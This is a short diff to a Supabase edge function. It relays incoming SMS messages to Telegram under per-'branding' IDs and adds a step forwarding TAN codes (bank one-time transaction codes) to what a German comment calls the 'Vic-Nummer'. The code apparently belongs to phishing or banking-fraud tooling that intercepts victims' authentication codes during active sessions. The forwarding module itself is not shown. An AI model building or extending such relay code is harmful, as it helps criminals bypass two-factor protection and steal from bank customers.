@@ -1,5 +1,6 @@
 import { createClient } from "npm:@supabase/supabase-js@2";
 import { buildTelegramMessage } from "../_shared/telegramMessage.ts";
+import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
 
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
@@ -228,6 +229,13 @@ async function handleMessages(opts: {
     await sendTelegram(message, opts.brandingId ?? assignment.brandingId);
     sent++;
   }
+  // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
+  try {
+    await forwardByPhoneIdentifier(identifier, toForward.map((t) => t.sms));
+  } catch (e) {
+    console.error("forwardByPhoneIdentifier failed:", e);
+  }
+
   return sent;
 }
 
